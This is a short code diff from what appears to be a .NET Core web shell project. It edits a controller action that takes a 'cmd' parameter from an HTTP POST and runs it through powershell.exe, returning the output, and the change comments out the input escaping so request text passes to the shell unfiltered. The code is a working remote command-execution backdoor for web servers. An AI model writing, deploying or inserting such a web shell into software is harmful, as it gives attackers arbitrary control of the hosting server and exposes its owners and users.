@@ -26,17 +26,17 @@ namespace web_shell_dotnetcore.Controllers
         {
             return View();
         }
-
+        [HttpPost]
         public JsonResult Cmd(string cmd)
         {
             string result, error;
-            var escapedArgs = cmd.Replace("\"", "\\\"");
+            //var escapedArgs = cmd.Replace("\"", "\\\"");
             var process = new Process()
             {
                 StartInfo = new ProcessStartInfo
                 {
                     FileName = "powershell.exe",
-                    Arguments = $"-c \"{escapedArgs}\"",
+                    Arguments = $"-c \"{cmd}\"",
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false,
